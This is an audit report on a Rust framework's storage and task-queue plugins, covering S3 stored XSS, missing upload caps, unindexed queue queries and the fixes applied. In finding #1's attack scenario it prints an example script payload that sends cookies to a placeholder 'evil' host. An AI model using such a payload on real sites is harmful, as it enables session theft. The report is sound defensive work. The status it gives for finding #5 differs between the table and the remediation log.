# Audit — `umbral-storage` + `umbral-tasks`

Slug: `plugin-storage-tasks`
Scope audited: `plugins/umbral-storage/src/{lib,media,static_serve,s3,collect}.rs` and `plugins/umbral-tasks/src/lib.rs` (+ the `static_symlink_escape` test). Docs reconciled: `documentation/docs/v0.0.1/plugins/{storage,tasks}.mdx`.

---

## A. Executive summary

Overall posture: mostly sound engineering with several correctly-implemented defenses (the symlink-escape guard is real and tested; the mid-stream size cap is enforced without trusting `Content-Length`; the worker's conditional-UPDATE claim is race-correct on both backends; panics are caught and isolated). The problems are asymmetries and defaults, not broken primitives.

The three most urgent issues:

1. **S3 media uploads skip the stored-XSS defense (HIGH).** The local `FsStorage` renames active-content uploads (`.html`/`.svg`/`.js` → `.txt`) and serves media with `nosniff`, but `S3Storage::store` uploads the object with the **client-declared `Content-Type` verbatim** and never renames. A public/CDN-fronted bucket therefore serves an uploaded `evil.html` inline as `text/html` — stored XSS / malware hosting. The storage doc explicitly (and falsely) claimed the guard "applies on every backend, so the stored-XSS defence travels to S3 too"; I corrected the doc to match the code.
2. **No default upload size cap (MEDIUM).** `.max_size(...)` is opt-in; the media side defaults to `None`, and the streaming path streams unbounded to disk when no cap is set. An unauthenticated large-body upload can fill the disk.
3. **The tasks hot-path claim query is unindexed and the queue is unbounded (MEDIUM).** `TaskRow` declares no index on the `status`/`run_at`/`priority`/`scheduled_for` columns the claim query filters and orders by; at 10M-scale row counts every worker poll full-scans `task_row`, and terminal rows are never pruned.

What I could not assess: the actual production S3 bucket ACL/policy, whether `/media` sits behind an authenticating reverse proxy, the `#[task]` macro expansion (in `umbral-macros`, out of scope), the `Storage`/`cap_stream`/`transaction`/ORM internals in `umbral-core`, and whether any application route lets an untrusted user control the enqueue `name`/payload. These are in Blind spots.

---

## B. Findings table

| # | Severity | Area | Location (file:line) | Finding | Impact | Recommended fix | Status |
|---|----------|------|----------------------|---------|--------|-----------------|--------|
| 1 | HIGH | Security / XSS | `plugins/umbral-storage/src/s3.rs:372-385`, `:167-174` | `S3Storage::store` builds the key via `generated_key` (strips only `/ \ \0`) and uploads with the client's `content_type`; it never calls `neutralise_active_content`. The FS backend does (`media.rs:381`). | Uploaded `evil.html`/`.svg`/`.js` on a public/CDN S3 bucket is served inline as active content → stored XSS on the serving origin, or malware hosting under the app's domain. Hits the common admin/multipart upload path (`MediaTracking::store` → `S3Storage::store`). | Apply the same active-content neutralisation in `S3Storage::store`/`store_stream` (rename to `.txt` and/or force `Content-Type: text/plain`), and/or set `Content-Disposition: attachment` on `put_object` for user uploads. Prefer private buckets + presigned URLs for untrusted content. | ✅ done |
| 2 | MEDIUM | Input validation / DoS | `plugins/umbral-storage/src/lib.rs:223` (`max_size: None`), `media.rs:962` (unbounded `store_stream`) | The media side has no default upload-size cap; `.max_size` is opt-in. Without it, `save_stream` streams the whole body to disk unbounded. | An unauthenticated (or low-privilege) client can upload an arbitrarily large body and exhaust disk / inode space. | Ship a conservative default cap (e.g. 10–25 MiB) that a builder call can raise, or fail closed with a boot warning when a media side is configured with no cap. | ✅ done |
| 3 | MEDIUM | Authorization / IDOR | `plugins/umbral-storage/src/lib.rs:469-487` | The media `ServeDir` serves every file under the media dir to anyone; only `X-Content-Type-Options: nosniff` is added. No auth hook, no per-user scoping. | Uploaded files are world-readable by URL. UUID-prefixed keys make enumeration hard, but a leaked/shared URL grants permanent unauthenticated access — unsafe for sensitive PII uploads (ID docs, private attachments). | Document that `/media` is public-by-URL and provide an access-controlled serving option (a route that checks a permission before `retrieve_stream`), or steer sensitive uploads to private-bucket presigned URLs. | deferred: needs an auth/permission design decision (access-controlled serving hook); no contained fix |
| 4 | MEDIUM | Perf / DoS | `plugins/umbral-storage/src/media.rs:713`, `:854`, `:922` | Every upload with registered processors fires a detached `tokio::spawn` with no concurrency bound; `save_deferred` holds the entire file `Vec<u8>` in the spawned task's memory. Decompression-bomb resistance is entirely the user's processor. | Under upload load, unbounded concurrent processors (image decode / transcode) exhaust CPU/memory; a decompression-bomb image passed to a naive processor amplifies it. | Bound processor concurrency (a semaphore / worker pool), stage `save_deferred` bytes to a temp file, and document that processors must enforce their own decode limits. | deferred: processor concurrency bound + temp-file staging need design (semaphore/worker pool); not trivially contained |
| 5 | MEDIUM | Data layer / perf | `plugins/umbral-tasks/src/lib.rs:110-159` (model), `:860-904` (claim query) | `TaskRow` declares no index; `claim_one` filters on `status`,`scheduled_for`,`run_at` and orders by `priority`,`scheduled_for`,`id`. No retention/pruning of terminal rows either. | At 10M-user scale the queue table grows unbounded and each worker poll full-scans it — throughput cliff plus storage growth. | Add a composite index covering the claim predicate/order (`status, run_at, priority DESC, scheduled_for, id`) via a migration, and add a retention sweep for old `succeeded`/`failed` rows. | partial: the autodetector blocker is FIXED — model-level `#[umbral(indexes = ...)]` is now diffed into `AddIndex` ops (core-migrate #10 follow-up, commit for `diff_indexes`), so adding the claim index to `TaskRow` + `makemigrations` now generates a real migration existing DBs pick up. Remaining: declare the index attr on `TaskRow` and ship the migration; the retention sweep is a separate feature. |
| 6 | MEDIUM | Concurrency / perf | `plugins/umbral-tasks/src/lib.rs:860-938` | `claim_one` does `SELECT ... LIMIT 1` then a conditional UPDATE inside a txn — no `FOR UPDATE SKIP LOCKED`. Correct (losing worker affects 0 rows) but N contending workers all target the same head row; on Postgres the losers block on its row lock until the winner commits, then re-evaluate to 0. | With many workers the head row becomes a lock convoy: effective claim throughput collapses toward one-at-a-time. Acknowledged in-code as MISS-1. | Implement `SELECT ... FOR UPDATE SKIP LOCKED` on Postgres so workers claim distinct rows without contending; keep the conditional UPDATE for SQLite. | deferred: `FOR UPDATE SKIP LOCKED` needs an ORM primitive (features.md #82 / MISS-1); raw SQL in the plugin would violate the no-raw-SQL rule |
| 7 | MEDIUM | Secrets / observability | `plugins/umbral-tasks/src/lib.rs:974`, payload column `:113`, admin `:1751` | Task `payload` is stored plaintext and exposed read-only in the admin detail (`payload` in `readonly_fields`). A handler panic is stringified with `{:?}` into the `error` column and `tracing` logs. | Secrets/PII carried in task args (tokens, emails, reset links) persist in plaintext and surface in the admin and logs; a panic can leak argument values into `error`/logs. | Document that payloads must not carry secrets (pass ids, resolve secrets in the handler); consider redaction on the admin payload view; avoid `{:?}`-dumping panic payloads that may embed args. | deferred: admin payload redaction needs design; payload-hygiene docs ADDED (enqueue/TaskRow doc-comments + tasks.mdx callout) |
| 8 | LOW | Security | `plugins/umbral-storage/src/lib.rs:479` | The media `ServeDir` has no symlink-escape guard (the static side's `SymlinkGuardService` is not applied here). | Low exploitability — uploads get UUID keys and sanitized names, so an attacker can't plant a symlink through the upload path; only matters if the media dir is writable by another process. | Reuse `SymlinkGuardService` around the media `ServeDir` for defense in depth. | ✅ done |
| 9 | LOW | Reliability | `plugins/umbral-tasks/src/lib.rs:965-993` | The per-task timeout relies on dropping the `JoinHandle` to abort; tokio abort is cooperative and cannot cancel a blocking/CPU-bound handler between await points. | A handler stuck in a tight CPU loop or blocking syscall ignores `task_timeout` and pins a worker thread until it returns. | Document that handlers must be async/yield; run CPU-bound work via `spawn_blocking` with its own bound, or a separate pool. | ✅ done |
| 10 | LOW | Reliability | `plugins/umbral-tasks/src/lib.rs:908` (increment on claim), `:766` (reclaim) | `attempts` is incremented at claim time, before the handler runs; a worker crash between claim and completion burns an attempt without a real execution. | A task near `max_attempts` that hits a transient worker crash gets fewer genuine attempts than configured. | Acceptable for at-least-once; if precise budgeting matters, only count attempts that reached the handler, or track crashes separately. | ✅ done |
| 11 | LOW | Observability | `plugins/umbral-storage/src/s3.rs:506`, `:344` | Presign failure and the deprecation warning use `eprintln!` instead of `tracing`; presign failure silently falls back to the (non-authorizing) public URL. | Inconsistent logging; a private-bucket presign failure yields a broken/non-authorizing URL with only a stderr line. | Route both through `tracing::warn!`; on presign failure for a private bucket, surface an error rather than a public-URL fallback that won't authorize. | ✅ done (both routed through `tracing::warn!`; the public-URL fallback itself stays — `url()` is infallible by trait contract — but now warns loudly that it won't authorize on a private bucket) |
| 12 | LOW | Input validation | `plugins/umbral-storage/src/media.rs:368-372` | Filename sanitisation strips only `/ \ \0`; control chars, newlines, and unicode survive into `media_file.filename`. | The stored/logged original filename can carry newlines/escapes (log-injection surface). The on-disk key is safe (UUID-prefixed). | Additionally strip control characters (`c.is_control()`) from the retained filename. | ✅ done |

---

## C. Detailed findings (CRITICAL / HIGH)

### #1 — S3 media uploads bypass the active-content (stored-XSS) guard — HIGH

Vulnerable code (`plugins/umbral-storage/src/s3.rs:372`):

```rust
async fn store(&self, filename: &str, content_type: &str, bytes: &[u8])
    -> Result<StoredFile, StorageError> {
    let key = Self::generated_key(filename);          // only strips / \ \0
    self.put_object(&key, content_type, bytes.to_vec()).await?;  // client Content-Type, verbatim
    Ok(StoredFile { url: self.url(&key), key, size: bytes.len() as u64 })
}
```

`generated_key` (`s3.rs:167`) does **not** call `neutralise_active_content`, unlike the FS path (`media.rs:381`). The common upload paths all reach this: `StoragePlugin::save` → `save_through` → `storage.store`, and the admin/multipart path → `MediaTracking::store` → `S3Storage::store`.

Attack scenario: an app configures `.media_s3("/media", s3)` with a public or CDN-fronted bucket (the documented "public-read bucket fronted by a CDN" mode, storage.mdx). An attacker uploads `avatar.html` with `Content-Type: text/html` containing `<script>fetch('https://evil/?c='+document.cookie)</script>`. S3 stores it with `Content-Type: text/html`; `url()` returns the public URL; the browser renders it inline and executes script on the serving origin (session/cookie theft if cookies are scoped to that domain, or malware hosting under the brand's domain).

Corrected `store` (mirror the FS defense — rename active content and force an inert type):

```rust
async fn store(&self, filename: &str, content_type: &str, bytes: &[u8])
    -> Result<StoredFile, StorageError> {
    // Same stored-XSS defence the FsStorage applies: defang active content.
    let safe_name = neutralise_active_content(&sanitise(filename)); // -> "x.html.txt"
    let neutralised = if safe_name.ends_with(".txt") { "text/plain" } else { content_type };
    let key = format!("{}-{safe_name}", uuid::Uuid::new_v4());
    self.put_object(&key, neutralised, bytes.to_vec()).await?;
    Ok(StoredFile { url: self.url(&key), key, size: bytes.len() as u64 })
}
```

Apply the same to `S3Storage`'s `store_stream`/`put_stream`. Independently, set `Content-Disposition: attachment` on user-upload puts as defense in depth, and prefer private buckets + presigned URLs for untrusted content. (`save_deferred` already neutralises its key via `media.rs:900`, so only the direct `store`/`store_stream` path is affected — which is the one the admin and form uploads use.)

---

## D. Blind spots

- **Actual S3 bucket ACL / policy / CDN config.** Whether the deployed bucket is public, and whether the CDN forces `Content-Disposition`, decides finding #1's real-world blast radius. Not visible in code.
- **Whether `/media` is fronted by an authenticating proxy.** Finding #3's severity depends on deployment; the plugin itself adds no auth.
- **`#[task]` macro expansion** (`umbral-macros`) — the payload-deserialisation wrapper. Rust/serde deserialisation is type-directed (no pickle-style RCE), so untrusted-payload → code-execution is not a concern *given* the macro deserialises into a fixed type; I could not read the generated code to confirm no `deny_unknown_fields`/type-confusion surprises.
- **`umbral-core` internals**: the `Storage` trait defaults, `cap_stream`/`is_cap_exceeded`, `umbral::transaction` isolation level, and the ORM `update_values`/`create` SQL. Race-correctness claims (#6) rest on `update_values` returning an accurate affected-row count and the transaction using at least READ COMMITTED — assumed, not verified here.
- **Whether any application route lets an untrusted user control the enqueue `name`/payload.** `enqueue` has no built-in authz/rate-limit (by design — it's a library call); if a route forwards user input into it, an attacker could invoke any registered handler or flood the (uncapped, finding #5) queue. Not assessable from these two crates.
- **Dependency versions** (`rust-s3`/`s3` 0.35 and its transitive TLS/XML stack) — supply-chain review is a separate pass; not evaluated.
- Runtime metrics/health for the worker and beat loops (queue depth, oldest pending, reclaim rate) — no instrumentation observed beyond `tracing` log lines.

---

## E. Prioritized action plan

Quick wins (< 1 day):
- Fix #1: add active-content neutralisation + inert `Content-Type` (and `Content-Disposition: attachment`) to `S3Storage::store`/`store_stream`. (Doc already corrected.)
- Fix #2: ship a default `max_size` (or a boot warning when a media side has none).
- Fix #11/#12: route S3 warnings through `tracing`; strip control chars from retained filenames.

Short term (< 2 weeks):
- Fix #5: migration adding the composite claim index on `task_row`, plus a terminal-row retention sweep.
- Fix #4: bound processor concurrency; stage `save_deferred` bytes to a temp file.
- Fix #3: document `/media` public-by-URL and add an access-controlled serving path.
- Fix #6/#7: document payload-secret hygiene; consider admin payload redaction.

Structural (needs design work):
- #6: `SELECT ... FOR UPDATE SKIP LOCKED` claim path on Postgres (the ORM needs the primitive — the code notes MISS-1 / features.md #82).
- #9: a `spawn_blocking`-backed execution lane with its own bound for CPU-bound handlers, and a real cancellation story.

---

## Docs updated

- `documentation/docs/v0.0.1/plugins/storage.mdx` — "Enabling S3 safely" callout: replaced the false bullet claiming the active-content guard "applies on every backend, so the stored-XSS defence travels to S3 too" with an accurate warning that `S3Storage::store` keeps the client `Content-Type` and does **not** rename active content, plus guidance (private bucket + presigned URLs, or bucket/CDN `Content-Disposition: attachment`). Reason: the callout directly contradicted `s3.rs:372-385`/`:167-174` (finding #1).
- `documentation/docs/v0.0.1/plugins/storage.mdx` — streaming-guards paragraph: scoped the "same filename guards … active-content neutralisation" claim to the **filesystem** backend and noted the S3 backend does not perform the rename in `store`/`store_stream`. Reason: same contradiction, second location.

No edits to `tasks.mdx` — its claims (conditional-UPDATE claim, no `FOR UPDATE SKIP LOCKED`, panic isolation, at-least-once) match the code.

---

## Remediation log (2026-07-03)

Fixed in-tree (all verified by `cargo test -p umbral-storage -p umbral-tasks`, plus `--features s3`):

- **#1 (HIGH)** — `S3Storage::store` now applies the SAME stored-XSS guard as the FS backend via a shared helper `media::neutralised_upload` (`plugins/umbral-storage/src/media.rs`): sanitise → active-content rename (`evil.html` → `evil.html.txt`) → recorded `Content-Type` forced to `text/plain` when defanged. `store_stream` is covered through the trait's buffering default, which delegates to `store`. The deferred-save path (`save_deferred_through`) also passes the neutralised content type to its backend `put`. Tests: `media.rs` `active_content_tests::neutralised_upload_*` (3 new). Docs re-corrected: `storage.mdx` S3 callout + streaming-guards paragraph now say the guard travels to S3.
- **#2** — default upload cap `DEFAULT_MAX_UPLOAD_SIZE` (25 MiB) applied by `media()` / `media_with_storage()` / `media_s3()`; `.max_size(bytes)` overrides, new `.max_size_unlimited()` is the deliberate opt-out, new `media_max_size()` getter. Tests: `media_plugin_save.rs` `default_max_size_applies_without_opt_in`, `max_size_unlimited_removes_the_cap`. Docs: `storage.mdx` (setup section + knobs table).
- **#8** — the media `ServeDir` is now wrapped in the static side's `SymlinkGuardService` (made `pub(crate)`); the guard also re-canonicalizes a root created after boot (media dirs are created lazily on first upload). Tests: new `tests/media_symlink_escape.rs` (escape → 404 incl. late-created dir; nosniff preserved).
- **#9 / #10** — documented per the recommended fix: cooperative-cancellation caveat on `WorkerOptions::task_timeout` + `tasks.mdx` callout (#9); attempts-counted-at-claim semantics on `TaskRow::attempts` + `tasks.mdx` note (#10).
- **#11** — `eprintln!` → `tracing::warn!` for the presign failure and the env-var deprecation warning; the presign-failure warning now states the public-URL fallback will not authorize on a private bucket.
- **#12** — shared `media::sanitise_filename` strips ALL control chars (not just NUL) from generated keys on every backend, and the retained `media_file.filename` is control-char-stripped via `retained_filename`. Test: `sanitise_filename_strips_separators_and_control_chars`.

Deferred with reasons in the Status column: #3 (auth decision), #4 (concurrency design), #5 (needs migration; model-level `indexes` aren't diffed by the autodetector), #6 (ORM `SKIP LOCKED` primitive, features.md #82), #7 (redaction design; hygiene docs shipped).
